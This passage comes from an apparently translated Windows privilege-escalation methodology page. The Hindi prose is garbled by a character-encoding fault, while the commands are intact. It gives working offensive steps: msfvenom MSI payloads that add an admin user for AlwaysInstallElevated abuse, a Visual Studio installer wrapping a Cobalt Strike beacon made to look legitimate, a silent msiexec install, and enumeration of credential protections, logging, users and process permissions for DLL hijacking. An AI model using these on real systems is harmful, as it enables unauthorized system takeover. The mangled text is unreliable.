рд╕реЗрдЯрд┐рдВрдЧреНрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреВрд░реА рд╣реЛрддреА рд╣реИрдВред

рджреЛрд╖ рдХреЛ рдЦреЛрдЬреЗрдВ [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

рд╣рдорд▓реЗ рдХреА рд╡рд┐рд╕реНрддреГрдд рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

рдпрджрд┐ рдпреЗ 2 рд░рдЬрд┐рд╕реНрдЯрд░ **рд╕рдХреНрд╖рдо** рд╣реИрдВ (рдорд╛рди **0x1** рд╣реИ), рддреЛ рдХрд┐рд╕реА рднреА рд╡рд░реНрдЪрд╕реНрд╡ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ `*.msi` рдлрд╝рд╛рдЗрд▓реЗрдВ NT AUTHORITY\\**SYSTEM** рдХреЗ рд░реВрдк рдореЗрдВ **рд╕реНрдерд╛рдкрд┐рдд** (рдирд┐рд╖реНрдкрд╛рджрд┐рдд) рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit рдкреЗрд▓реЛрдбреНрд╕
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдореАрдЯрд░рдкреНрд░реЗрдЯрд░ рд╕рддреНрд░ рд╣реИ рддреЛ рдЖрдк рдЗрд╕ рддрдХрдиреАрдХ рдХреЛ рдСрдЯреЛрдореЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **`exploit/windows/local/always_install_elevated`** рдореЙрдбреНрдпреВрд▓ред

### PowerUP

рдкрд╛рд╡рд░-рдЕрдк рд╕реЗ `Write-UserAddMSI` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рд╡рд░реНрддрдорд╛рди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдПрдХ Windows MSI рдмрд╛рдЗрдирд░реА рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░реЗрдВред рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдПрдХ рдкреВрд░реНрд╡-рд╕рдВрдХрд▓рд┐рдд MSI рд╕реНрдерд╛рдкрдХ рд▓рд┐рдЦрддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рд╕рдореВрд╣ рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдкреВрдЫрддрд╛ рд╣реИ (рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ GIU рдПрдХреНрд╕реЗрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА):
```
Write-UserAddMSI
```
### MSI Wrapper

рдЗрд╕ рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рдХреЛ рдкрдврд╝реЗрдВ рддрд╛рдХрд┐ рдЖрдк рдЗрд╕ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ MSI рд░реИрдкрд░ рдмрдирд╛ рд╕рдХреЗрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк рдПрдХ "**.bat**" рдлрд╝рд╛рдЗрд▓ рдХреЛ рд░реИрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдЧрд░ рдЖрдк **рдХреЗрд╡рд▓** **рдХрдорд╛рдВрдб рд▓рд╛рдЗрдиреНрд╕** **рдЪрд▓рд╛рдирд╛** рдЪрд╛рд╣рддреЗ рд╣реИрдВред

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### WIX рдХреЗ рд╕рд╛рде MSI рдмрдирд╛рдПрдВ

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Visual Studio рдХреЗ рд╕рд╛рде MSI рдмрдирд╛рдПрдВ

* **Cobalt Strike** рдпрд╛ **Metasploit** рдХреЗ рд╕рд╛рде **рдирдпрд╛ Windows EXE TCP рдкреЗрд▓реЛрдб** рдЬреЗрдирд░реЗрдЯ рдХрд░реЗрдВ `C:\privesc\beacon.exe`
* **Visual Studio** рдЦреЛрд▓реЗрдВ, **рдирдпрд╛ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдмрдирд╛рдПрдВ** рдФрд░ рдЦреЛрдЬ рдмреЙрдХреНрд╕ рдореЗрдВ "installer" рдЯрд╛рдЗрдк рдХрд░реЗрдВред **рд╕реЗрдЯрдЕрдк рд╡рд┐рдЬрд╝рд╛рд░реНрдб** рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ **рдЕрдЧрд▓рд╛** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
* рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЛ рдПрдХ рдирд╛рдо рджреЗрдВ, рдЬреИрд╕реЗ **AlwaysPrivesc**, рд▓реЛрдХреЗрд╢рди рдХреЗ рд▓рд┐рдП **`C:\privesc`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, **рд╕рдорд╛рдзрд╛рди рдФрд░ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЛ рдПрдХ рд╣реА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд░рдЦреЗрдВ** рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ, рдФрд░ **рдмрдирд╛рдПрдВ** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
* **рдЕрдЧрд▓реЗ** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рддреЗ рд░рд╣реЗрдВ рдЬрдм рддрдХ рдЖрдк рдЪрд░рдг 3 рдореЗрдВ рди рдкрд╣реБрдВрдЪ рдЬрд╛рдПрдВ (рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╝рд╛рдЗрд▓реЗрдВ рдЪреБрдиреЗрдВ)ред **рдЬреЛрдбрд╝реЗрдВ** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдЬреЗрдирд░реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ Beacon рдкреЗрд▓реЛрдб рдЪреБрдиреЗрдВред рдлрд┐рд░ **рд╕рдорд╛рдкреНрдд** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
* **рд╕рдорд╛рдзрд╛рди рдПрдХреНрд╕рдкреНрд▓реЛрд░рд░** рдореЗрдВ **AlwaysPrivesc** рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЛ рд╣рд╛рдЗрд▓рд╛рдЗрдЯ рдХрд░реЗрдВ рдФрд░ **рдЧреБрдг** рдореЗрдВ, **TargetPlatform** рдХреЛ **x86** рд╕реЗ **x64** рдореЗрдВ рдмрджрд▓реЗрдВред
* рдЖрдк рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд┐рдП рдЧрдП рдРрдк рдХреЛ рдЕрдзрд┐рдХ рд╡реИрдз рджрд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП **рд▓реЗрдЦрдХ** рдФрд░ **рдирд┐рд░реНрдорд╛рддрд╛** рдЬреИрд╕реЗ рдЕрдиреНрдп рдЧреБрдг рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред
* рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдкрд░ рджрд╛рдпрд╛рдВ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ **рджреГрд╢реНрдп > рдХрд╕реНрдЯрдо рдХреНрд░рд┐рдпрд╛рдПрдБ** рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред
* **рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВ** рдкрд░ рджрд╛рдпрд╛рдВ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ **рдХрд╕реНрдЯрдо рдХреНрд░рд┐рдпрд╛ рдЬреЛрдбрд╝реЗрдВ** рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред
* **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдлрд╝реЛрд▓реНрдбрд░** рдкрд░ рдбрдмрд▓-рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдЕрдкрдиреА **beacon.exe** рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ **рдареАрдХ** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред рдЗрд╕рд╕реЗ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рд╣реЛрдЧрд╛ рдХрд┐ рдмреАрдХрди рдкреЗрд▓реЛрдб рдХреЛ рддреБрд░рдВрдд рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдП рдЬрдм рдЗрдВрд╕реНрдЯреЙрд▓рд░ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПред
* **рдХрд╕реНрдЯрдо рдХреНрд░рд┐рдпрд╛ рдЧреБрдгреЛрдВ** рдХреЗ рддрд╣рдд, **Run64Bit** рдХреЛ **True** рдореЗрдВ рдмрджрд▓реЗрдВред
* рдЕрдВрдд рдореЗрдВ, рдЗрд╕реЗ **рдмрд┐рд▓реНрдб рдХрд░реЗрдВ**ред
* рдпрджрд┐ рдЪреЗрддрд╛рд╡рдиреА `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` рджрд┐рдЦрд╛рдИ рджреЗрддреА рд╣реИ, рддреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдкрдиреЗ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдХреЛ x64 рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рд╣реИред

### MSI рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди

рдЬрд╛рд╕реВрд╕реА рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг `.msi` рдлрд╝рд╛рдЗрд▓ рдХреА **рд╕реНрдерд╛рдкрдирд╛** рдХреЛ **рдкреГрд╖реНрдарднреВрдорд┐ рдореЗрдВ** **рдЪрд▓рд╛рдиреЗ** рдХреЗ рд▓рд┐рдП:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
## рдЗрд╕ рд╡рдВрд░рдмрд┐рд▓рд┐рдЯреА рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: _exploit/windows/local/always\_install\_elevated_

## рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ рдФрд░ рдбрд┐рдЯреЗрдХреНрдЯрд░реНрд╕

### рдСрдбрд┐рдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕

рдпреЗ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рддрдп рдХрд░рддреА рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ **рд▓реЙрдЧ** рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдзреНрдпрд╛рди рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдП
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, рдпрд╣ рдЬрд╛рдирдирд╛ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдХрд┐ рд▓реЙрдЧ рдХрд╣рд╛рдВ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** рдХрд╛ рдирд┐рд░реНрдорд╛рдг **рд╕реНрдерд╛рдиреАрдп рдкреНрд░рд╢рд╛рд╕рдХ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рдкреНрд░рдмрдВрдзрди** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдкреНрд░рддреНрдпреЗрдХ рдкрд╛рд╕рд╡рд░реНрдб **рдЕрджреНрд╡рд┐рддреАрдп, рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдФрд░ рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдЕрдкрдбреЗрдЯ** рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдбреЛрдореЗрди рд╕реЗ рдЬреБрдбрд╝реЗ рдХрдВрдкреНрдпреВрдЯрд░реЛрдВ рдкрд░ рд╣реЛрддрд╛ рд╣реИред рдпреЗ рдкрд╛рд╕рд╡рд░реНрдб рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ Active Directory рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдХреЗрд╡рд▓ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдкрд╣реБрдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ ACLs рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐ рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рд╣реИ, рдЬреЛ рдЙрдиреНрд╣реЗрдВ рд╕реНрдерд╛рдиреАрдп рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдкрд╛рд╕рд╡рд░реНрдб рджреЗрдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

рдпрджрд┐ рд╕рдХреНрд░рд┐рдп рд╣реИ, **рд╕рд╛рджрд╛-рдкрд╛рда рдкрд╛рд╕рд╡рд░реНрдб LSASS рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд** рд╣реЛрддреЗ рд╣реИрдВред\
[**WDigest рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдЗрд╕ рдкреГрд╖реНрда рдореЗрдВ**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA рд╕реБрд░рдХреНрд╖рд╛

**Windows 8.1** рд╕реЗ рд╢реБрд░реВ рдХрд░рдХреЗ, рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдиреЗ рд╕реНрдерд╛рдиреАрдп рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рд╛рдзрд┐рдХрд░рдг (LSA) рдХреЗ рд▓рд┐рдП рдЙрдиреНрдирдд рд╕реБрд░рдХреНрд╖рд╛ рд╢реБрд░реВ рдХреА рдЬрд┐рд╕рд╕реЗ рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдЗрд╕рдХреА рдореЗрдореЛрд░реА рдХреЛ рдкрдврд╝рдиреЗ рдпрд╛ рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢реЗрдВ рдмреНрд▓реЙрдХ рдХреА рдЬрд╛рддреА рд╣реИ, рдЬреЛ рд╡реНрдпрд╡рд╕реНрдерд╛ рдХреЛ рдФрд░ рдЕрдзрд┐рдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛рддрд╛ рд╣реИред\
[**LSA рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЧрд╛рд░реНрдб

**рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдЧрд╛рд░реНрдб** рдХреЛ **Windows 10** рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдЗрд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдЙрди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрдирд╛ рд╣реИ рдЬреЛ рдПрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдкрд░ рд╕реНрдЯреЛрд░ рдХрд┐рдП рдЧрдП рд╣реИрдВ рдФрд░ рдкрд╛рд╕-рдж-рд╣реИрд╢ рдЬреИрд╕реЗ рд╣рдорд▓реЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрдирд╛ рд╣реИред|
[**рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЧрд╛рд░реНрдб рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБред**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### рдХреИрд╢ рдХрд┐рдП рдЧрдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓

**рдбреЛрдореЗрди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓** рдХреЛ **рд╕реНрдерд╛рдиреАрдп рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рд╛рдзрд┐рдХрд░рдг** (LSA) рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдШрдЯрдХреЛрдВ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓реЙрдЧрдСрди рдбреЗрдЯрд╛ рдХреЛ рдПрдХ рдкрдВрдЬреАрдХреГрдд рд╕реБрд░рдХреНрд╖рд╛ рдкреИрдХреЗрдЬ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдбреЛрдореЗрди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рд╕рд╛рдорд╛рдиреНрдпрдд: рд╕реНрдерд╛рдкрд┐рдд рд╣реЛрддреЗ рд╣реИрдВред\
[**рдХреИрд╢ рдХрд┐рдП рдЧрдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБ рджреЗрдЦреЗрдВ**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рд╕рдореВрд╣

### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдФрд░ рд╕рдореВрд╣реЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ

рдЖрдкрдХреЛ рдпрд╣ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдЖрдкрдХреЗ рд╕рдореВрд╣реЛрдВ рдореЗрдВ рд╕реЗ рдХреЛрдИ рднреА рджрд┐рд▓рдЪрд╕реНрдк рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВред
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдд рд╕рдореВрд╣

рдпрджрд┐ рдЖрдк **рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдд рд╕рдореВрд╣ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ**ред рдпрд╣рд╛рдБ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдд рд╕рдореВрд╣реЛрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЙрдиреНрдирдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдиреЗрдВ:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### рдЯреЛрдХрди рдорд╛рдирд┐рдкреБрд▓реЗрд╢рди

рдЗрд╕ рдкреГрд╖реНрда рдкрд░ **рдЯреЛрдХрди** рдХреНрдпрд╛ рд╣реИ рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ **рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдиреЗрдВ**: [**Windows Tokens**](../authentication-credentials-uac-and-efs.md#access-tokens)ред\
рдЗрдиреНрдЯрд░реЗрд╕реНрдЯрд┐рдВрдЧ рдЯреЛрдХрдиреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЙрдиреНрдирдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### рд▓реЙрдЧ рдЗрди рдХрд┐рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ / рд╕рддреНрд░
```bash
qwinsta
klist sessions
```
### рд╣реЛрдо рдлреЛрд▓реНрдбрд░реНрд╕
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐
```bash
net accounts
```
### рдХреНрд▓рд┐рдкрдмреЛрд░реНрдб рдХреА рд╕рд╛рдордЧреНрд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
```bash
powershell -command "Get-Clipboard"
```
## рдЪрд▓ рд░рд╣реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ

### рдлрд╝рд╛рдЗрд▓ рдФрд░ рдлрд╝реЛрд▓реНрдбрд░ рдЕрдиреБрдорддрд┐рдпрд╛рдБ

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рд╕реВрдЪреАрдмрджреНрдзрд┐ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**ред\
рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк **рдХреБрдЫ рдмрд╛рдЗрдирд░реА рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдмрд╛рдЗрдирд░реА рдлрд╝реЛрд▓реНрдбрд░ рдХреА рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ рддреЛ рд╕рдВрднрд╛рд╡рд┐рдд [**DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рд╣рдорд▓реЛрдВ**](dll-hijacking.md) рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
рд╣рдореЗрд╢рд╛ рд╕рдВрднрд╛рд╡рд┐рдд [**electron/cef/chromium debuggers** рдЪрд▓ рд░рд╣реЗ рд╣реИрдВ, рдЖрдк рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд░реНрдЪрд╕реНрд╡ рдЙрдиреНрдирддрд┐ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдмрд╛рдЗрдирд░реА рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдлреЛрд▓реНрдбрд░реЛрдВ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдБрдЪ (DLL Hijacking)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
